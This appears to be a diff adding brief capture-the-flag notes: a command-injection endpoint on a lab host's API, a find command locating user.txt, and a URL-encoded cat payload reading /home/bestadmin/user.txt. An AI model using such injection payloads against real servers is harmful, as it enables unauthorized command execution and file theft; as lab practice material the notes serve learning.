@@ -1,0 +1,7 @@
+http://10.10.197.254:3000/api/cmd/pwd ---> Command Injection
+
+Find user.txt --> find -name "user.txt"
+
+At ./home/bestadmin/user.txt"
+
+cat%20home%2Fbestadmin%2Fuser.txt
